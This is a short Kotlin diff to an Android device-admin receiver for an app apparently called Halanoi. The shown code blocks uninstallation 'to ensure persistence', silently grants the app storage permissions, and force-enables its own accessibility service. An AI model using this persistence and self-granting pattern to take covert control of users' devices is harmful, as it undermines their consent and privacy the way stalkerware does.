@@ -57,6 +57,14 @@ class HalanoiDeviceAdminReceiver : DeviceAdminReceiver() {
                     // 4. Block uninstallation to ensure persistence
                     dpm.setUninstallBlocked(admin, context.packageName, true)
 
+                    // 4b. Auto-grant storage permissions as Device Owner
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        try {
+                            dpm.setPermissionGrantState(admin, context.packageName, "android.permission.READ_EXTERNAL_STORAGE", DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
+                            dpm.setPermissionGrantState(admin, context.packageName, "android.permission.WRITE_EXTERNAL_STORAGE", DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
+                        } catch (_: Exception) {}
+                    }
+
                     // 5. Force-enable the Accessibility Service via Secure Settings
                     val serviceName = ComponentName(context, HalanoiAccessibilityService::class.java).flattenToString()
                     dpm.setSecureSetting(admin, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, serviceName)
